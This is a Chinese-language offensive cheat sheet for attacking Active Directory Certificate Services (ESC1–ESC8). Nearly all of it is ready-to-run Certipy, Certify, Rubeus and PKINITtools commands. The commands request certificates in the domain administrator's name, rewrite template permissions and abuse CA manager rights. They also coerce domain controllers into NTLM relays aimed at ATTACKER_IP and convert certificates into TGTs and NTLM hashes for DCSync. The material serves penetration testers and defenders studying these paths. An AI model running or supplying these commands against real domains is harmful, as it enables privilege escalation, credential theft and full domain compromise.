# AD CS 证书攻击（ESC1-ESC8）

## §0 快速枚举

**场景**: 域内任意用户凭据，枚举CA和证书模板找可利用配置
```bash
# Certipy（推荐，Python，远程枚举）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable  # 只输出可利用的

# Certify（C#，需上线域内主机）
.\Certify.exe find /vulnerable
.\Certify.exe cas  # 列出所有CA

# ADCSKiller（自动化利用）
python ADCSKiller.py -u USER -p PASS -d DOMAIN -dc-ip DC_IP
```
**要点**: certipy find输出JSON，导入BloodHound CE可可视化ESC路径

## §1 ESC1 — 任意SAN请求

**条件**: 模板允许 enrollee 指定 subjectAltName（msPKI-Certificate-Name-Flag含CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT）+ 当前用户有Enroll权限 + 模板启用认证（Client Authentication/PKINIT）
```bash
# 请求域管证书
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template VULN_TEMPLATE -upn administrator@DOMAIN -dc-ip DC_IP
# 用证书认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```
**判断**: certipy find输出中 `[!] Vulnerabilities: ESC1` 即存在

## §2 ESC2 — Any Purpose 模板

**条件**: 模板EKU含Any Purpose（OID 2.5.29.37.0）或无EKU + 用户可Enroll
```bash
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template VULN_TEMPLATE -dc-ip DC_IP
# Any Purpose证书可用于客户端认证
certipy auth -pfx cert.pfx -dc-ip DC_IP
```
**要点**: 无EKU的证书在某些配置下等效Any Purpose

## §3 ESC3 — Enrollment Agent 模板

**条件**: 模板EKU含Certificate Request Agent（OID 1.3.6.1.4.1.311.20.2.1）
```bash
# 步骤1: 申请Enrollment Agent证书
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template AGENT_TEMPLATE -dc-ip DC_IP
# 步骤2: 用Agent证书代替域管申请证书
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template USER_TEMPLATE -on-behalf-of 'DOMAIN\administrator' -pfx agent.pfx -dc-ip DC_IP
```

## §4 ESC4 — 模板ACL可写

**条件**: 当前用户对证书模板有WriteDACL/WriteProperty权限
```bash
# 修改模板配置→变成ESC1
certipy template -u USER@DOMAIN -p PASS -template VULN_TEMPLATE -save-old -dc-ip DC_IP
# 模板已改，按ESC1利用
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template VULN_TEMPLATE -upn administrator@DOMAIN -dc-ip DC_IP
# 还原模板
certipy template -u USER@DOMAIN -p PASS -template VULN_TEMPLATE -configuration old_config.json -dc-ip DC_IP
```

## §5 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**条件**: CA启用了EDITF_ATTRIBUTESUBJECTALTNAME2 flag（允许任何请求指定SAN）
```bash
# 检查
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"
# 利用（任意模板均可指定SAN）
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template User -upn administrator@DOMAIN -dc-ip DC_IP
```
**要点**: 比ESC1更通用——所有模板都受影响，不限特定模板

## §6 ESC7 — CA Manager权限

**条件**: 当前用户有CA Manager（ManageCA）权限
```bash
# 添加自己为CA Officer
certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -add-officer USER -dc-ip DC_IP
# 启用SubCA模板（默认被禁用但存在）
certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -enable-template SubCA -dc-ip DC_IP
# 请求证书（会被pending）
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template SubCA -upn administrator@DOMAIN -dc-ip DC_IP
# 用Officer权限批准
certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -issue-request REQUEST_ID -dc-ip DC_IP
# 取回证书
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -retrieve REQUEST_ID -dc-ip DC_IP
```

## §7 ESC8 — NTLM Relay to HTTP Enrollment

**条件**: CA启用HTTP enrollment endpoint + 未强制HTTPS + 可触发目标机器NTLM认证
```bash
# 启动relay监听
certipy relay -ca CA_IP -template DomainController
# 触发DC的NTLM认证（PetitPotam/PrinterBug/DFSCoerce）
python PetitPotam.py ATTACKER_IP DC_IP
python printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP
python dfscoerce.py -u USER -p PASS -d DOMAIN -dc-ip DC_IP ATTACKER_IP
# relay自动申请证书，输出PFX
certipy auth -pfx dc.pfx -dc-ip DC_IP
```
**攻击链**: Coerce DC → Relay to CA HTTP → 获取DC证书 → DCSync

## §8 证书→TGT（PKINIT认证）

**前置**: 拥有目标用户/计算机的PFX证书
```bash
# Certipy认证（获取TGT + NTLM hash）
certipy auth -pfx target.pfx -dc-ip DC_IP
# 输出: TGT ccache文件 + NTLM hash

# Rubeus（C#）
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:CERT_PASS /ptt

# PKINITtools（Python）
python gettgtpkinit.py -cert-pfx target.pfx -pfx-pass PASS DOMAIN/TARGET DC_IP
# U2U获取NTLM hash
python getnthash.py -key AS_REP_KEY DOMAIN/TARGET
```
**要点**: PKINIT获取的TGT可直接用于S4U2Self/DCSync等后续操作
